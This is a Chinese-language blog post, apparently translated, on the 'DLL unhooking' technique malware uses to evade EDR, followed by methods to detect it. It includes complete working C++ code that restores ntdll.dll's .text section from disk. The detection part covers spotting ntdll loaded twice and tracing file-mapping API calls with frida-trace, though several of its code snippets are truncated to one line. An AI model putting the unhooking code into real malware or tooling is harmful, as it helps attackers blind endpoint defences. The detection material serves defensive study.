恶意软件通常采用UnHook技术来解锁DLL(这种方法可完全解锁内存中加载的任何给定DLL)以逃避EDR的监管。最近，看到一篇老外的文章，给出了一种“检测EDR逃避”的检测方法。文末附上“API UnHooking逃避EDR”的参考文。

  

**导读：**包含三部分：Dll UnHooking代码、检测方法、参考文章。  

  

**一、引言**

    EDR功能的很大一部分是它们能够将一个DLL注入到运行的进程中，并挂接特定的Windows API调用来监视恶意使用。如在flNewProtect参数中检测到PAGE\_execute\_readwrite，相同的还有VirtualProtect、alert。这是一个重要的功能，也是红队或对手希望绕过的东西。绕过这个EDR的方法之一是映射目标DLL的干净版本并替换掉.text，这将导致目前被加载的目标DLL无钩子存在。

  

**二、****Dll UnHooking过程**

1、将新的ntdll.dll副本从磁盘映射到进程内存中；

2、找到挂起的ntdll.dll的.text节的虚拟地址；

    a、获取ntdll.dll的基地址；  

    b、模块基地址 + 模块的.text节VirtualAddress；

3、查找新映射的ntdll.dll的.text节的虚拟地址；

4、获得挂钩模块的.text节的原始内存保护；

5、从新映射的dll复制到原始(hooked)ntdll.dll的虚拟地址(在3中找到)，这是unhooking的主要部分，因为所有hooked的字节都会被磁盘上的新字节覆盖；

6、将原始内存保护应用于原始ntdll.dll的新近unhook的.text部分。

这个很像Hook的“X字节”大法，只不过是相反的。

**三、所用的****UnHook****代码**

    

#include "pch.h"

#include <iostream>

#include <Windows.h>

#include <winternl.h>

#include <psapi.h>

  

int main()

{

HANDLE process = GetCurrentProcess();

MODULEINFO mi = {};

HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");

  

GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));

  

LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;

  

HANDLE ntdllFile = CreateFileA("c:\\\\windows\\\\system32\\\\ntdll.dll", GENERIC\_READ, FILE\_SHARE\_READ, NULL, OPEN\_EXISTING, 0, NULL);

  

HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE\_READONLY | SEC\_IMAGE, 0, 0, NULL);

  

LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE\_MAP\_READ, 0, 0, 0);

  

PIMAGE\_DOS\_HEADER hookedDosHeader = (PIMAGE\_DOS\_HEADER)ntdllBase;

  

PIMAGE\_NT\_HEADERS hookedNtHeader = (PIMAGE\_NT\_HEADERS)((DWORD\_PTR)ntdllBase + hookedDosHeader->e\_lfanew);

  

for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++)

{

PIMAGE\_SECTION\_HEADER hookedSectionHeader = (PIMAGE\_SECTION\_HEADER)((DWORD\_PTR)IMAGE\_FIRST\_SECTION(hookedNtHeader) + ((DWORD\_PTR)IMAGE\_SIZEOF\_SECTION\_HEADER \* i));

  

if (!strcmp((char\*)hookedSectionHeader->Name, (char\*)".text"))

{

DWORD oldProtection = 0;

  

bool isProtected = VirtualProtect((LPVOID)((DWORD\_PTR)ntdllBase + (DWORD\_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE\_EXECUTE\_READWRITE, &oldProtection);

  

memcpy((LPVOID)((DWORD\_PTR)ntdllBase + (DWORD\_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD\_PTR)ntdllMappingAddress + (DWORD\_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);

  

isProtected = VirtualProtect((LPVOID)((DWORD\_PTR)ntdllBase + (DWORD\_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);

}

}

  

CloseHandle(process);

CloseHandle(ntdllFile);

CloseHandle(ntdllMapping);

FreeLibrary(ntdllModule);

  

return 0;

}

  

**四、检测方法**

**1、****Ntdll****被加载两次**

    目标dll将被加载两次。windows运行可执行文件的部分方式是每个可执行文件自动加载3个dll，分别是:NTDll.dll、Kernel32.dll和KernelBase.dll。这种行为可观察到，首先，在调试器中，打开未挂钩的可执行文件并单步。最初，可看到4个

# 2、使用 Frida 跟踪 API 调用

    也可用来分析UnHook行为的是frida-trace，这个工具常针对可执行文件中CreateFileA、CreateFileMapping 和 MapViewOfFile等。运行命令frida-trace -f <path to exe> -I KERNELBASE.DLL -i Create\* -i Map\*。这将创建一堆JS文件，得到调用的参数和返回值。我们来修改这些个js，得到我们想要的内容。首先，我们先通过查看此代码部分来了解如何将ntdll的新副本映射到内存的结构。

  

```



HANDLE ntdllFile = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
```

其次，文件被打开以使用 CreateFileA 读取，并返回文件的句柄。CreateFileMapping调用使用此句柄来准备要映射到内存中的文件。然后 MapViewOfFile使用CreateFileMapping创建的句柄将ntdll的新副本实际映射到内存中。这可以在Frida中通过编辑 JS 处理程序文件来输出我们想要看到的内容来观察。如果打开处理程序文件，您将看到两个函数，onenter 和 onleave。onenter 函数接受一些参数，现在最重要的一个是 args。Args 是提供给目标 Windows API 调用的参数数组。可以使用 msdn 获取 C 中的函数定义并将其转换为 JS。如，CreateFileA 调用的结构如下所示。

```









HANDLE CreateFileA(
```

将其转化为 Frida 可以解释的内容将如下所示。

```















onEnter(log, args, state) {
```

为CreatFileMapping和MapViewOfFile创建的onenter和oneleave函数。

```
































onEnter(log, args, state) {
```

将代码添加到各自的处理程序文件并重新运行 frida-trace 后，输出将如下所示。

![](../Images/f1b35bda689bd34cae16c85fd383ce6c.png)

单步执行源代码应该会揭示这些调用是如何相互关联的。例如，CreateFileA 的返回值是一个值为 0x244 的句柄。这个句柄由 CreateFileMappingA 使用，它返回另一个值为 0x248 的句柄。然后这个句柄被 MapViewOfFile 使用。这表明在 CreateFileA 中访问的任何文件都被映射到当前进程内存中。
